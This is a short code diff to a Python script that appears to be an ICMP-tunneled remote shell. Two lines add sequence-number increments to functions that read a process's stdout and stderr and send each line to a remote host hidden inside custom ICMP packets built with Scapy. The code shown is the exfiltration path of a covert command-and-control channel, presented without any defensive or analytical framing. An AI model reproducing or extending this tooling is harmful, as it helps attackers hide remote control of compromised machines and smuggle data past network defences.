@@ -26,6 +26,7 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
+        config.SEQ = config.SEQ + 1
         packet_bytes = bytes(CustomICMP(code=config.RESPONSE_CODE) / string)
         reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
                         CustomICMP(code=config.RESPONSE_CODE, chksum=calc_checksum(packet_bytes)) / string)
@@ -38,6 +39,7 @@ def readstderr():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
+        config.SEQ = config.SEQ + 1
         packet_bytes = bytes(CustomICMP(code=config.RESPONSE_CODE) / string)
         reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
                         CustomICMP(code=config.RESPONSE_CODE, chksum=calc_checksum(packet_bytes)) / string)
